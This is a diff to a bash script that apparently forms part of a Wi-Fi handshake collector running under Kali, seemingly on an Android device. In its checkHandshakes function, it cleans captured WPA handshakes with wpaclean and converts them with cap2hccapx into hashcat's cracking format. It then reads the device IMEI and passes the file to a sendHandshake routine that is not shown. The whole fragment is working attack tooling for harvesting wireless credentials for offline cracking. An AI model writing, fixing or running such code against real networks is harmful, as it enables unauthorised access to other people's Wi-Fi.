@@ -68,14 +68,12 @@ sendHandshake() {
 checkHandshakes() {
         printf "\n"
         echo "Check handshakes..."
-        wpaclean /home/kali/hscollector/cleancap.cap /home/kali/hscollector/shakes-01.cap
-        output=$(cap2hccapx /home/kali/hscollector/cleancap.cap /home/kali/hscollector/cleanshakes.hccapx)
-        rm cleancap.cap
-        echo $output
-        if [[ "$output" == *"Written 0"* ]] || [[ "$output" == *"Networks detected: 0"* ]]; then
-                printf "\033[31mNo handshakes\033[0m\n"
-                rm /home/kali/hscollector/cleanshakes.hccapx >/dev/null
-        else
+        cleanout=$(wpaclean /home/kali/hscollector/cleancap.cap /home/kali/hscollector/shakes-01.cap)
+        if [[ "$cleanout" == *"Net"* ]]; then
+                output=$(cap2hccapx /home/kali/hscollector/cleancap.cap /home/kali/hscollector/cleanshakes.hccapx)
+                rm cleancap.cap
+                echo $output
+                
                 imei=$(chroot /proc/1/cwd/ service call iphonesubinfo 1 | cut -c 52-66 | tr -d '.[:space:]')
                 printf "\033[32mHandshakes detected!!!\033[0m\n"
                 time=$(date +%s)
@@ -89,6 +87,7 @@ checkHandshakes() {
                 fi
                 sendHandshake $filename
         fi
+        
 
 }
 
